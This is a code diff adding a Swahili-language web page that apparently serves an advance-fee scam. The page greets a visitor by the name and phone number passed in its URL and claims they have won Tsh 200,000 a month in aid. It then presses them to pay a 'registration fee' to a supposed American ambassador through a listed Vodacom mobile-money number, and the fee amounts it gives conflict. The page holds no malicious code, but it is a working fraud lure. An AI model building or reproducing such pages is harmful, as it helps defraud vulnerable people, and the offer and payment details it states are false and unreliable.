@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Malipo na Ofa</title> 
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100vh;
+    /* Gradient background blending green and purple */
+    background: linear-gradient(135deg, green, purple);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .container {
+    width: 90%;
+    max-width: 600px;
+    max-height: 90vh;
+    padding: 20px;
+    box-sizing: border-box;
+    background-color: rgba(0, 0, 0, 0.3);
+    border-radius: 10px;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: stretch;
+    overflow-y: auto;
+  }
+  .section-title {
+    font-weight: bold;
+    font-size: 24px;
+    color: white;
+    text-align: center;
+    margin-bottom: 0px;
+  }
+  #verifiedSection .icon-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 10px;
+  }
+  .circle {
+    width: 20px;
+    height: 20px;
+    background-color: green;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .checkmark {
+    width: 12px;
+    height: 12px;
+    fill: white;
+  }
+  #tinyText {
+    background-color: black;
+    font-size: 10px;
+    text-align: center;
+    padding: 5px;
+  }
+  #payText {
+    margin-top: 20px;
+  }
+  #payText p, #payText span, #payText pre {
+    font-family: Arial, sans-serif;
+    font-size: 14px;
+    font-weight: bold;
+    line-height: 1.4;
+    white-space: pre-wrap;
+  }
+  /* WhatsApp button container */
+  #bottomWhatsApp {
+    display: flex;
+    justify-content: center;
+    margin: 10px 0 0px 0;
+  }
+  #bottomWhatsApp button {
+    background: none;
+    border: none;
+    cursor: pointer;
+  }
+  #bottomWhatsApp img {
+    width: 24px;
+    height: 24px;
+    object-fit: contain;
+  }
+  /* Nyuma button at bottom */
+  #backButtonContainer {
+    display: flex;
+    justify-content: center;
+    margin-top: 10px;
+  }
+  #backButton {
+    padding: 10px 20px;
+    font-size: 12px;
+    cursor: pointer;
+    border: none;
+    background-color: #2196F3;
+    color: white;
+    border-radius: 5px;
+  }
+  #backButton:hover {
+    background-color: #ADD8E6;
+  }
+  #copyButton {
+    margin-left: 10px;
+    background-color: #555;
+    border: none;
+    padding: 6px 12px;
+    border-radius: 50px;
+    color: white;
+    cursor: pointer;
+  }
+  #copyButton:hover {
+    background-color: #777;
+  }
+  #copyAlert {
+    position: absolute;
+    background-color: #ccc;
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 12px;
+    color: #000;
+    opacity: 0;
+    transition: opacity 0.3s;
+    z-index: 9999;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <!-- MALIPO NA OFA header -->
+  <div class="section-title">MALIPO NA OFA</div>
+  
+  <!-- payText content -->
+  <div id="payText"></div>
+
+  <!-- Message with icon -->
+  <div id="tinyText" style="margin-top:10px;">
+    Fanya Malipo Yako Kupitia Laini Au Wakala(Yeyote).
+  </div>
+  
+  <!-- Nyuma Button -->
+  <div id="backButtonContainer" style="margin-top:20px; display:flex; justify-content:center;">
+    <button id="backButton">Nyuma</button>
+  </div>
+</div>
+
+<!-- Copy alert -->
+<div id="copyAlert"></div>
+
+<!-- REMOVE LiveChat Script -->
+<!--
+<script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 19495137;
+    window.__lc.integration_name = "manual_channels";
+    window.__lc.product_name = "livechat";
+
+    // Load LiveChat widget
+    (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice));
+</script>
+-->
+
+<!-- Script to autofill visitor info -->
+<script>
+  // Retrieve URL parameters
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  // Get name and phone_number from URL or default
+  const name = getQueryParam('name') || 'Hakuna Jina';
+  const email = getQueryParam('email') || 'zuchu@gmail.com'; // You can change default email
+
+  // When LiveChat widget loads, set visitor info
+  window.addEventListener('load', function() {
+    if (window.LiveChatWidget) {
+      window.LiveChatWidget.call('set_visitor', {
+        name: name,
+        email: email
+      });
+    }
+  });
+</script>
+
+<!-- Your existing scripts -->
+<script>
+const instructionText1 = `Hongera ${name} (${getQueryParam('phone_number') || 'Hakuna Namba'}) Hongera! Umechaguliwa kupokea msaada wa kifedha wa kila mwezi wa Tsh 200,000. Ili kuanza mchakato wa malipo, unahimizwa kulipa ada ya usajili ya Tsh 2,000 moja kwa moja kwa balozi wetu wa Marekani, Neema, ambaye yuko Dar es Salaam. Malipo haya ni muhimu ili aweze kuwasilisha maombi yako kwa mamlaka za Marekani na kuanza kupokea fedha hizo kila mwezi kuanzia leo.
+Tafadhali hakikisha unaongeza taarifa sahihi za malipo na kufanya hivyo kwa haraka ili usipoteze nafasi hii adhimu. Malipo yako ni hatua muhimu ya kufungua mlango wa msaada wa kifedha unaostahili.
+Asante kwa kuungana nasi katika juhudi hizi za maendeleo na usaidizi wa kijamii.
+Nambari Ya Malipo Hii Hapa. Thibitisha Nambari Usije Ukakosea.`;
+
+const instructionText2 = '        Nambari: 0792164260';
+
+const instructionText3 = `        Jina: Neema Dotto
+        Mtandao: Vodacom
+        Kiasi: 7000`;
+
+// Populate payText
+const payTextDiv = document.getElementById('payText');
+payTextDiv.innerHTML = '';
+
+const p1 = document.createElement('p');
+p1.textContent = instructionText1;
+payTextDiv.appendChild(p1);
+
+const div2 = document.createElement('div');
+div2.style.display='flex';
+div2.style.alignItems='center';
+div2.style.marginBottom='10px';
+
+const span2 = document.createElement('span');
+span2.textContent=instructionText2;
+
+const btnCopy = document.createElement('button');
+btnCopy.id='copyButton';
+btnCopy.textContent='Copy';
+btnCopy.style.marginLeft='10px';
+
+div2.appendChild(span2);
+div2.appendChild(btnCopy);
+payTextDiv.appendChild(div2);
+
+const pre3 = document.createElement('pre');
+pre3.textContent=instructionText3;
+payTextDiv.appendChild(pre3);
+
+const copyAlert = document.getElementById('copyAlert');
+document.getElementById('copyButton').addEventListener('click', () => {
+  const textToCopy = instructionText2.split(':')[1].trim();
+  navigator.clipboard.writeText(textToCopy).then(() => {
+    const rect = document.getElementById('copyButton').getBoundingClientRect();
+    copyAlert.textContent='Nambari Imekopiwa Kwenye Clipboard! ';
+    copyAlert.style.top=(window.scrollY+rect.top-30)+'px';
+    copyAlert.style.left=(window.scrollX+rect.left+rect.width/2 - copyAlert.offsetWidth/2)+'px';
+    copyAlert.style.opacity=1;
+    setTimeout(()=>{copyAlert.style.opacity=0;},2000);
+  });
+});
+document.getElementById('backButton').addEventListener('click',()=>{window.location.href='index3.html';});
+</script>
+</body>
+  </html>
